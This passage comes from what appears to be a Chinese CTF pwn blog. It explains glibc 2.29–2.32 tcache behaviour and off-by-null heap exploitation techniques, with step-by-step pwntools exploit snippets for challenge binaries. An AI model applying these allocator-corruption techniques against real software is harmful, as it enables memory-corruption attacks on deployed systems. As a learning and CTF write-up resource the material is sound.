class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;the no.&#x27;</span> + <span class="built_in">str</span>(count) + <span class="string">&#x27; try&#x27;</span>)</span><br><span class="line">        p = process([<span class="string">&#x27;/home/hacker/glibc/2.32/glibc-2.32_build/elf/ld.so&#x27;</span>, <span class="string">&#x27;./pwn&#x27;</span>], env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:<span class="string">&quot;/home/hacker/glibc/2.32/glibc-2.32_build/libc.so.6&quot;</span>&#125;)</span><br><span class="line">        <span class="comment">#p = remote(&#x27;node3.buuoj.cn&#x27;, 26018)#process(&#x27;./ff&#x27;) #</span></span><br><span class="line">        exp()</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    	<span class="built_in">print</span>(e)</span><br><span class="line">        p.close()</span><br><span class="line">        count = count + <span class="number">1</span></span><br><span class="line">        <span class="keyword">continue</span></span><br></pre></td></tr></table></div></figure>

<p>▲总结一下：</p>
<p>(1)IO_FILE的新知识：</p>
<p>new(0x78,p64(0xfbad1800) + p64(0)*3 + b’\x00’)</p>
<p>(2)2.32Tcache机制：</p>
<p>①放入tcache对应bin链表时会异或heap_base/0x1000，并且fd也会变化。</p>
<p>②bin链表中的count和申请与否的关系：</p>
<p>如果tcache的对应bin的count为0，则不会从该Tcache中申请。</p>
<p>如果大于等于1，那么就需要看tcache结构体上对应bin链表存放的chunk地址是否为一个合法的了，如果不合法则会申请失败，程序退出。(应该都是这样的)</p>
<p>③需要修改Key字段才能double free，即free 的时候会检测 key 字段是否为 tcache，如果相等则检测 free 的指针值是否在对应的tcache的bin上，如果在则视为程序在 double free，进而终止程序。</p>
</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/08/14/2.29%E4%B8%8B%E7%9A%84off-by-null/">2.29下的off-by-null</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-08-14</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2021-08-19</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>△相比2.29之前的版本中，在向上合并时加了一项检查：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">if (__glibc_unlikely (chunksize(p) != prevsize))</span><br><span class="line">    malloc_printerr (&quot;corrupted size vs. prev_size while consolidating&quot;);</span><br></pre></td></tr></table></div></figure>

<p>就是检查上一个chunk的size是否等于当前chunk的pre_size。之前的off-by-null肯定是不等于的啊，所以这里就一定会出错。那么2.29的绕过方法就是通过smallbin和largebin来伪造一个chunk，满足：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">①fake_chunk-&gt;fd-&gt;bk == fake_chunk_addr</span><br><span class="line">②fake_chunk-&gt;bk-&gt;fd == fake_chunk_addr</span><br><span class="line">③fake_chunk-&gt;size = trigger_chunk-&gt;pre_size</span><br></pre></td></tr></table></div></figure>

<p>其中③用来过新增加的检查：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">if (__glibc_unlikely (chunksize(p) != prevsize))</span><br><span class="line">    malloc_printerr (&quot;corrupted size vs. prev_size while consolidating&quot;);</span><br></pre></td></tr></table></div></figure>

<p>①和②用来过unlink中的检查：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))</span><br><span class="line">    malloc_printerr (check_action, &quot;corrupted double-linked list&quot;, P, AV);</span><br></pre></td></tr></table></div></figure>

<p>这样就能够成功off-by-null了，图示如下(用了<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-257901-1.htm#msg_header_h2_2" >t1an5g的博客</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>的图片，侵删)：</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191444152.png" alt="img"></p>
<p>1.下面简单说下流程：</p>
<p>(1)进行一定的堆布局，使得起作用的chunk的堆地址为0xx…x0010，同时也方便计算偏移，从而进行低位字节覆盖。</p>
<p>(2)通过largebin的fd_nextsize指针和bk_nextsize指针，加上字节覆盖使得fake_chunk的fd指针指向指定FD(即下面的chunk18)，fake_chunk的bk指针指向指定BK(即下面的chunk17)。</p>
<p>(3)通过fastbin和smallbin的连用，加上字节覆盖使得FD(chunk18)的bk指针指向fake_chunk。</p>
<p>(4)通过fastbin加上字节覆盖使得BK(chunk17)的fd指针指向fake_chunk。</p>
<p>(5)进行完以上操作就得到类似上图的堆布局，之后就可以绕过检查，触发off-by-null。</p>
<p>2.详细介绍一下具体实现方法：</p>
<p>(1)先申请17个chunk,chunk0-chunk16，其中chunk0-chunk7用来进行堆布局，使得后面的chunk15的地址为0xx..x0010，即使得申请的堆地址的第二个字节为”\x00”，以便之后覆盖的时候不用进行一字节爆破，从而进行对抗off-by-null的0字节溢出。当然，如果条件限制的话， 其实是可以不用chunk0-chunk7的布局，用一字节爆破来解决问题。chunk8-chunk14大小为0x28，用来填充0x30大小的tcache。chunk15即关键部分，chunk16防止合并。</p>
<p>(2)释放chunk15，size应该大于tcache的最大size，这里的chunk15最好设置大一点，大佬的博客设置了0xb20大小。然后chunk15就会进入unsortedbin中，由于unsortedbin中只有一个chunk15，所以chunk15的指针会有以下效果：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">chunk15-&gt;fd == main_arena+88(unsortebin_addr)</span><br><span class="line">chunk15-&gt;bk == main_arena+88</span><br></pre></td></tr></table></div></figure>

<p>(3)申请一个0x28大小的chunk17，同时由于此时bin中没有chunk，只有Unsortedbin才有chunk15，所以会将chunk15先放入largebin中，之后再从chunk15中切割，返回chunk17，所以此时chunk15在largebin中，又只有它一个chunk，由于放入largebin的赋值语句，所以在切割之前会变成：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">chunk15-&gt;fd == largebin_addr</span><br><span class="line">chunk15-&gt;bk == largebin_addr</span><br><span class="line">chunk15-&gt;fd_nextsize == chunk15_addr</span><br><span class="line">chunk15-&gt;bk_nextsize == chunk15_addr</span><br></pre></td></tr></table></div></figure>

<p>切割之后，chunk17获得了chunk15残留下来的fd，bk，fd_nextsize，bk_nextsize。因为chunk17是用来构造fake_chunk的，所以大小需要至少有0x20。那么此时的chunk17中内容就会如下：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">chunk17-&gt;fd == largebin_addr</span><br><span class="line">chunk17-&gt;bk == largebin_addr</span><br><span class="line">chunk17-&gt;fd_nextsize == chunk17_addr</span><br><span class="line">chunk17-&gt;bk_nextsize == chunk17_addr</span><br></pre></td></tr></table></div></figure>

<p>然后构造在chunk17里制作fake_chunk，满足：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">fake_chunk-&gt;size == trigger_chunk-&gt;pre_size</span><br><span class="line">fake_chunk-&gt;fd == chunk18_addr</span><br><span class="line">fake_chunk-&gt;bk == chunk17_addr</span><br></pre></td></tr></table></div></figure>

<p>这里需要进行赋值：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">chunk17-&gt;fd = trigger_chunk-&gt;pre_size</span><br><span class="line">chunk17-&gt;fd_nextsize = &quot;\x40&quot;</span><br></pre></td></tr></table></div></figure>

<p>(后面会讲到为什么会这么赋值)之后的fake_chunk的bk自动继承了之前残留下来的指针。</p>
<p>(4)申请chunk18-chunk21，大小为0x28。使得chunk18-chunk21都是从chunk15中切割出来的，之后用chunk8-chunk14填满0x30的tcache，然后再顺序释放chunk20和chunk18，使得chunk18,chunk20进入fastbin(0x30)中，顺序为chunk18-&gt;chunk20。</p>
<p>(5)将chunk8-chunk14申请出来，清空tcache(0x30)，然后再申请一个0x400大小的chunk(超过smallbin大小即可)，这样就会将fastbin中的chunk，也就是chunk18和chunk20放入到smallbin中。由于smallbin和fastbin刚好相反，一个是FIFO一个是FILO，所以顺序会反过来，变成：chunk20-&gt;chunk18，但同时由于是bk寻址，所以再申请chunk会先把chunk18取出来，同时在smallbin中，那么就会满足chunk18-&gt;bk == chunk20_addr</p>
<p>(6)此时赋值chunk18-&gt;bk = fake_chunk_addr，这里不用知道堆地址，因为我们知道chunk20_addr - fake_chunk_addr == 0x80(sizeof(fake_chunk)+sizeof(chunk18)+sizeof(chunk19))。所以之前chunk0-chunk7就可以进行一些大小布局，使得chunk15_addr == 0xx…x0010，那么fake_chunk_addr == 0xx…x0020，chunk20_addr == 0xx…x00a0，这样我们就只需要把0xa0覆盖成0x20，也就是修改chunk18-&gt;bk的第一个字节为0x20即可。但同时由于off by null的关系，修改chunk18-&gt;bk的第一个字节势必会导致第二个字节为”\x00”，所以我们之前的堆布局也要使得chunk15_addr的第二个字节为”\x00”才可以。</p>
<p>那么现在也可以理解之前的一个赋值语句：chunk17-&gt;fd_nextsize = “\x40”，这里就是为了将”\x10”覆盖为”\x40”使其指向chunk18，同时使得第二个字节也为”\x00”。</p>
<p>这样就满足了：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">fake_chunk-&gt;size == trigger_chunk-&gt;pre_size</span><br><span class="line">fake_chunk-&gt;fd == chunk18_addr</span><br><span class="line">fake_chunk-&gt;bk == chunk17_addr</span><br><span class="line">chun18-&gt;bk == fake_chunk_addr</span><br><span class="line">chunk17-&gt;fd == chunk18_addr</span><br></pre></td></tr></table></div></figure>

<p>但是chunk17-&gt;fd不等于fake_chunk_addr。那么同样的操作再来一次，利用chunk17和chunk19，使其进入fastbin，将chunk17的fd指向chunk19，然后再申请回来，覆盖chunk17的fd指针，0x70覆盖为0x20即可。(由于2.29下的tcache会有key字段，使得chunk17的bk指针被修改，相当于修改fake_chunk的size位，这不是我们想看到的，所以还是用fastbin比较好)流程如下：</p>
<p>①将chunk20从tcache中申请出来，防止之后不好操作，然后再将chunk8-chunk14放入tcache中，使得之后的chunk进入fastbin。</p>
<p>②顺序释放chunk19，chunk17，使其进入fastbin中，使得chunk17-&gt;fd == chunk19_addr，就是0xx…x70。</p>
<p>③然后将chunk8-chunk14申请回来，再将chunk17申请回来，覆盖chunk17的fd的第一个字节为0x20，那么就可以满足总的条件：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">fake_chunk-&gt;size == trigger_chunk-&gt;pre_size</span><br><span class="line">fake_chunk-&gt;fd == chunk18_addr</span><br><span class="line">fake_chunk-&gt;bk == chunk17_addr</span><br><span class="line">chunk18-&gt;bk == fake_chunk_addr</span><br><span class="line">chunk17-&gt;fd == fake_chunk_addr</span><br></pre></td></tr></table></div></figure>

<p>(7)最后将chunk19申请回来，再从chunk15剩下的部分申请chunk22用来溢出。再申请chunk23将chunk15遗留的部分都申请回来，溢出之后释放掉，即可触发off by null，向上合并最初的chunk15-0x10大小的chunk，使得fake_chunk，chunk18,chunk19,chunk20,chunk21,chunk22,chunk23都被置入unsortedbin中。利用chunk8-chunk14对抗tcache，就可以随便玩了。(注意这里不需要像之前版本的off by null一样，还需要释放掉chunk0来绕过unlink检查，之前是因为不检查size位，所以直接释放掉即可。这里的fake_chunk已经替代了chunk0的作用，能够绕过Unlink的检查和size位的检查)</p>
<p>3.最后模拟一下代码，同样参考了大佬<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-257901-1.htm#msg_header_h2_2" >t1an5g的博客</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>：</p>
<p>(1)前期准备加堆布局:</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#注释头</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>): <span class="comment"># 0-6</span></span><br><span class="line">    add(<span class="number">0x1000</span>, <span class="string">&quot;padding&quot;</span>)</span><br><span class="line">add(<span class="number">0x1000</span>-<span class="number">0x410</span>, <span class="string">&quot;padding&quot;</span>) <span class="comment"># 7</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>): <span class="comment"># 8-14</span></span><br><span class="line">    add(<span class="number">0x28</span>, <span class="string">&#x27;tcache&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#crux chunk15</span></span><br><span class="line">add(<span class="number">0xb20</span>, <span class="string">&quot;largebin&quot;</span>) <span class="comment"># 15</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#prevent merge</span></span><br><span class="line">add(<span class="number">0x10</span>, <span class="string">&quot;padding&quot;</span>) <span class="comment"># 16</span></span><br></pre></td></tr></table></div></figure>

<p>(2)制作fake_chunk，利用largebin踩下fd_nextsize和bk_nextsize:</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#注释头</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">15</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#chunk15 to largebin</span></span><br><span class="line">add(<span class="number">0x1000</span>, <span class="string">&#x27;\n&#x27;</span>) </span><br><span class="line"></span><br><span class="line"><span class="comment">#make fake_chunk in chunk17</span></span><br><span class="line">add(<span class="number">0x28</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x521</span>) + p8(<span class="number">0x40</span>))</span><br></pre></td></tr></table></div></figure>

<p>(3)联动fastbin和smallbin：</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#注释头</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x28</span>, <span class="string">&#x27;a&#x27;</span>) <span class="comment"># 18</span></span><br><span class="line">add(<span class="number">0x28</span>, <span class="string">&#x27;b&#x27;</span>) <span class="comment"># 19</span></span><br><span class="line">add(<span class="number">0x28</span>, <span class="string">&#x27;c&#x27;</span>) <span class="comment"># 20</span></span><br><span class="line">add(<span class="number">0x28</span>, <span class="string">&#x27;d&#x27;</span>) <span class="comment"># 21</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># fill in tcache(0x30)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>): <span class="comment"># 8-14</span></span><br><span class="line">    delete(<span class="number">8</span> + i)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">20</span>)</span><br><span class="line">delete(<span class="number">18</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># clear tcache(0x30)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>): <span class="comment"># 8-14</span></span><br><span class="line">    add(<span class="number">0x28</span>, <span class="string">&#x27;padding&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># fastbin to smallbin</span></span><br><span class="line">add(<span class="number">0x400</span>, <span class="string">&#x27;padding&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># get chunk18 from smallbin ,chunk20 to tcache</span></span><br><span class="line"><span class="comment"># change chunk18-&gt;bk to point to fake_chunk</span></span><br><span class="line">add(<span class="number">0x28</span>, p64(<span class="number">0</span>) + p8(<span class="number">0x20</span>))</span><br></pre></td></tr></table></div></figure>

<p>(4)利用fastbin修改chunk17-&gt;fd：</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#注释头</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># clear chunk from tcache</span></span><br><span class="line">add(<span class="number">0x28</span>, <span class="string">&#x27;clear&#x27;</span>) <span class="comment"># 20 from tcache</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>): <span class="comment"># 8-14</span></span><br><span class="line">    delete(<span class="number">8</span> + i)</span><br><span class="line"></span><br><span class="line"><span class="comment"># free to fastbin</span></span><br><span class="line">delete(<span class="number">19</span>)</span><br><span class="line">delete(<span class="number">17</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>): <span class="comment"># 8-14</span></span><br><span class="line">    add(<span class="number">0x28</span>, <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># change chunk17-&gt;fd to point to fake_chunk</span></span><br><span class="line">add(<span class="number">0x28</span>, p8(<span class="number">0x20</span>))</span><br></pre></td></tr></table></div></figure>

<p>(5)触发off-by-null:</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#注释头</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x28</span>, <span class="string">&quot;clear&quot;</span>)<span class="comment">#19 from fastbin</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x28</span>, <span class="string">&quot;a&quot;</span>) <span class="comment"># 22 cutting from chunk15 in unsortebin,for overwrite</span></span><br><span class="line">add(<span class="number">0x5f8</span>, <span class="string">&quot;a&quot;</span>) <span class="comment"># 23 legacy from chunk15 in unsortebin,for trigger off-by-null</span></span><br><span class="line">add(<span class="number">0x100</span>, <span class="string">&quot;padding&quot;</span>) <span class="comment"># 24</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># off-by-null </span></span><br><span class="line">edit(<span class="number">22</span>, <span class="string">&quot;a&quot;</span>*<span class="number">0x20</span> + p64(<span class="number">0x520</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># trigger</span></span><br><span class="line">delete(<span class="number">23</span>)</span><br></pre></td></tr></table></div></figure>

<p>△以上的chunk索引对于题目具体分析，不同题目对索引的处理肯定不一样。</p>
<p>其实还有其他只利用unsortedbin和largebin的绕过，贴一下地址：</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/236078#h3-14" >https://www.anquanke.com/post/id/236078#h3-14</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>后面再来啃吧。</p>
</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/08/14/2.29-2.32%E4%B8%8B%E7%9A%84off-by-null/">2.29-2.32下的off-by-null</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-08-14</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2021-08-19</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>最近发现一种对于高版本libc更好的方法，不用爆破，先贴下连接：</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/236078#h3-7" >https://www.anquanke.com/post/id/236078#h3-7</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>而且这个可以说是通杀除了2.33版本的所有Libc，因为没用用到tcache和fastbin，这位大佬WJH师傅真是神仙。但是他的有些地方有点出入，刚开始调试的时候容易直接干蒙，所以这里总结一下。</p>
<p>▲总的来说是运用unsortedbin来踩地址，然后再借用unsortedbin和Largebin加上off-by-null来修复fd，bk，从而能够通过新增的检查。这里我拿</p>
<p>第三届山东新一代信息技术创新应用大赛 werewolf2，原题是2.27的，这里用2.31模拟一下。</p>
<p>这道题来举例，题目不同chunk的索引对应变化。</p>
<p>1.首先堆风水布局，让我们之后申请用来利用的chunk的后一个字节可控，就是得为0x00，方便off-by-null利用。</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#注释头</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x1000</span>-<span class="number">0x8</span>-<span class="number">0xf0</span>,<span class="string">&#x27;padd&#x27;</span>)<span class="comment">#0</span></span><br></pre></td></tr></table></div></figure>

<p>这个堆布局看具体的环境，有的题上来先申请一堆堆块，容易搞蒙，d调一下就知道了。</p>
<p>2.然后准备堆块，结合之前的堆布局，需要满足条件：</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#注释头</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x418</span>,<span class="string">&#x27;\x01&#x27;</span>*<span class="number">0x410</span>) <span class="comment">#1 fd  0x---2b0</span></span><br><span class="line">add(<span class="number">0x108</span>,<span class="string">&#x27;\x02*0x100&#x27;</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x418</span>,<span class="string">&#x27;\x03&#x27;</span>*<span class="number">0x410</span>) <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x438</span>,<span class="string">&#x27;\x04&#x27;</span>*<span class="number">0x430</span>) <span class="comment">#4 unlink_chunk  0x---c00</span></span><br><span class="line">add(<span class="number">0x108</span>,<span class="string">&#x27;\x05&#x27;</span>*<span class="number">0x100</span>) <span class="comment">#5</span></span><br><span class="line">add(<span class="number">0x428</span>,<span class="string">&#x27;\x06&#x27;</span>*<span class="number">0x420</span>) <span class="comment">#6 bk  0x---150</span></span><br><span class="line">add(<span class="number">0x208</span>,<span class="string">&#x27;\x07&#x27;</span>*<span class="number">0x200</span>) <span class="comment">#7</span></span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-29_22-18-35.png" alt="img"></p>
<p>其中0x108大小的堆块主要是辅助加隔离，然后0x428之类的几个不同大小是为切割unsortedbin来搞事。然后这里我申请了0x208大小的堆块，这个堆块的作用主要就是隔离和填充，然后原贴的大佬由于size位用到了\x0a，是个换行符，Pwn中一般比骄敏感，容易无法发送，所以这里我多申请0x100，让之后的size位变成\x0b，方便利用。</p>
<p>3.然后就开始搞事，首先释放这几个chunk。</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#注释头</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br></pre></td></tr></table></div></figure>

<p>满足如下：</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-29_22-33-40.png" alt="img"></p>
<p>释放顺序需要注意，要利用unsortedbin在0x—c00这个chunk上留下0x—2b0和0x—150的地址作为fd和bk，之后再修复fd-&gt;bk和bk-&gt;fd：</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-29_22-48-19.png" alt="img"></p>
<p>其中两个chunk合并了组成了0x—7e0这个chunk，方便切割之后修改0x—c00的size位。</p>
<p>4.之后申请chunk，从0x—7e0中申请切割，修改0x—c00的size位，同时会触发malloc_consolidate将0x—150和0x–2b0放入largebin中，这个没啥用，直接申请回来就可以了，主要是切割。</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#注释头</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x438</span>, <span class="string">&#x27;\x08&#x27;</span>*<span class="number">0x418</span> + p64(<span class="number">0xb91</span>)) <span class="comment">#8 set size</span></span><br><span class="line">add(<span class="number">0x418</span>,<span class="string">&#x27;\x09&#x27;</span>*<span class="number">0x410</span>) <span class="comment"># 9     0x---c20</span></span><br><span class="line">add(<span class="number">0x428</span>,<span class="string">&#x27;\x10&#x27;</span>*<span class="number">0x420</span>) <span class="comment"># 10 bk 0x---150</span></span><br><span class="line">add(<span class="number">0x418</span>,<span class="string">&#x27;\x11&#x27;</span>*<span class="number">0x410</span>) <span class="comment"># 11 fd 0x---2b0</span></span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-29_22-42-30.png" alt="img"></p>
<p>5.之后就开始修复fd和bk，利用0x—c20和对应的fd,bk，进入unsortedbin来修复。</p>
<p>(1)修复fd:</p>
<p>先释放0x—2b0，然后释放0x—c20，利用unsortedbin来给0x—2b0的bk踩上0x—c20的地址，然后申请回来，方便之后修复bk(0x—150)，同时将踩下的地址从0x—c20修改为0x—c00，即可修复成功。</p>
